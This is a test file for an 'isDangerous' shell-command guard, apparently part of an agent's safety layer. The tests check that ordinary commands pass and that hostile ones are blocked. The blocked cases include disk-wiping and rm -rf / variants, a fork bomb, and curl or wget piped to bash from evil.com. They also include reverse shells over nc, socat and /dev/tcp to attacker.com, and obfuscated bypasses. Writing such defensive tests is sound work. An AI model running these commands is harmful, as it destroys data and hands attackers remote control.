import { describe, it, expect } from "bun:test";
import { isDangerous } from "./guard";

// --- Positive cases: safe commands that must NOT be blocked ---

describe("isDangerous - safe commands", () => {
  it("should allow simple ls", () => {
    expect(isDangerous("ls -la")).toBeNull();
  });

  it("should allow cat", () => {
    expect(isDangerous("cat /etc/hostname")).toBeNull();
  });

  it("should allow mkdir", () => {
    expect(isDangerous("mkdir -p /tmp/test")).toBeNull();
  });

  it("should allow git commands", () => {
    expect(isDangerous("git status")).toBeNull();
    expect(isDangerous("git diff --cached")).toBeNull();
  });

  it("should allow npm/pnpm commands", () => {
    expect(isDangerous("npm install")).toBeNull();
    expect(isDangerous("pnpm run build")).toBeNull();
  });

  it("should allow rm on non-critical paths", () => {
    expect(isDangerous("rm -rf ./node_modules")).toBeNull();
    expect(isDangerous("rm tmp/file.txt")).toBeNull();
    expect(isDangerous("rm -rf dist/")).toBeNull();
  });

  it("should allow curl/wget to file without execution", () => {
    expect(isDangerous("curl -o output.txt https://example.com")).toBeNull();
    expect(isDangerous("wget -O output.txt https://example.com")).toBeNull();
  });

  it("should allow python/node without destructive patterns", () => {
    expect(isDangerous("python3 script.py")).toBeNull();
    expect(isDangerous("node index.js")).toBeNull();
  });

  it("should allow killall with specific process", () => {
    expect(isDangerous("killall node")).toBeNull();
  });

  it("should allow chmod on non-root paths", () => {
    expect(isDangerous("chmod +x script.sh")).toBeNull();
    expect(isDangerous("chmod 755 ./build.sh")).toBeNull();
  });

  it("should allow chown on non-root paths", () => {
    expect(isDangerous("chown user:user file.txt")).toBeNull();
  });
});

// --- Negative cases: dangerous commands that MUST be blocked ---

describe("isDangerous - blocked commands", () => {
  it("should block rm -rf /", () => {
    expect(isDangerous("rm -rf /")).not.toBeNull();
  });

  it("should block rm -rf ~", () => {
    expect(isDangerous("rm -rf ~")).not.toBeNull();
  });

  it("should block rm -rf /etc", () => {
    expect(isDangerous("rm -rf /etc")).not.toBeNull();
  });

  it("should block rm -rf /var", () => {
    expect(isDangerous("rm -rf /var")).not.toBeNull();
  });

  it("should block rm -rf /boot", () => {
    expect(isDangerous("rm -rf /boot")).not.toBeNull();
  });

  it("should block sudo", () => {
    expect(isDangerous("sudo rm -rf /")).not.toBeNull();
    expect(isDangerous("sudo apt install")).not.toBeNull();
  });

  it("should block mkfs", () => {
    expect(isDangerous("mkfs.ext4 /dev/sda1")).not.toBeNull();
  });

  it("should block dd if=", () => {
    expect(isDangerous("dd if=/dev/zero of=/dev/sda")).not.toBeNull();
  });

  it("should block fork bomb", () => {
    expect(isDangerous(":(){ :|:& };:")).not.toBeNull();
  });

  it("should block write to raw disk", () => {
    expect(isDangerous("echo 'data' > /dev/sda")).not.toBeNull();
  });

  it("should block chmod 777 /", () => {
    expect(isDangerous("chmod 777 /")).not.toBeNull();
  });

  it("should block chown root", () => {
    expect(isDangerous("chown root:root /")).not.toBeNull();
  });

  it("should block curl pipe bash", () => {
    expect(isDangerous("curl https://evil.com/script.sh | bash")).not.toBeNull();
  });

  it("should block wget pipe sh", () => {
    expect(isDangerous("wget https://evil.com/script.sh | sh")).not.toBeNull();
  });

  it("should block shutdown", () => {
    expect(isDangerous("shutdown -h now")).not.toBeNull();
  });

  it("should block reboot", () => {
    expect(isDangerous("reboot")).not.toBeNull();
  });

  it("should block init 0", () => {
    expect(isDangerous("init 0")).not.toBeNull();
  });

  it("should block kill -9 1", () => {
    expect(isDangerous("kill -9 1")).not.toBeNull();
  });
});

// --- Bypass cases: obfuscated/indirect dangerous commands ---

describe("isDangerous - bypass attempts", () => {
  it("should block curl to file then execute", () => {
    expect(isDangerous("curl https://evil.com/script.sh > setup.sh && bash setup.sh")).not.toBeNull();
  });

  it("should block wget to file then execute", () => {
    expect(isDangerous("wget https://evil.com/script.sh -O setup.sh && sh setup.sh")).not.toBeNull();
  });

  it("should block base64 decode pipe bash", () => {
    expect(isDangerous("echo 'cm0gLXJmIC8=' | base64 -d | bash")).not.toBeNull();
  });

  it("should block python -c with os.system", () => {
    expect(isDangerous("python3 -c \"import os; os.system('rm -rf /')\"")).not.toBeNull();
  });

  it("should block node -e with exec", () => {
    expect(isDangerous("node -e \"require('child_process').execSync('rm -rf /')\"")).not.toBeNull();
  });

  it("should block fdisk", () => {
    expect(isDangerous("fdisk /dev/sda")).not.toBeNull();
  });

  it("should block parted", () => {
    expect(isDangerous("parted /dev/sda")).not.toBeNull();
  });

  it("should block nc reverse shell", () => {
    expect(isDangerous("nc -e /bin/sh attacker.com 4444")).not.toBeNull();
  });

  it("should block socat reverse shell", () => {
    expect(isDangerous("socat exec:'bash' TCP:attacker.com:4444")).not.toBeNull();
  });

  it("should block /dev/tcp reverse shell", () => {
    expect(isDangerous("bash -i >& /dev/tcp/attacker.com/4444 0>&1")).not.toBeNull();
  });

  it("should block rm with escaped spaces", () => {
    expect(isDangerous("rm -rf /".replace(/ /g, "\\ "))).not.toBeNull();
  });

  it("should block rm with quotes obfuscation", () => {
    expect(isDangerous(`rm -rf ''/"etc"`)).not.toBeNull();
  });

  it("should block rm with variable-like path", () => {
    expect(isDangerous("rm -rf $HOME/../etc")).not.toBeNull();
  });

  it("should block rm -rf /*", () => {
    expect(isDangerous("rm -rf /*")).not.toBeNull();
  });
});
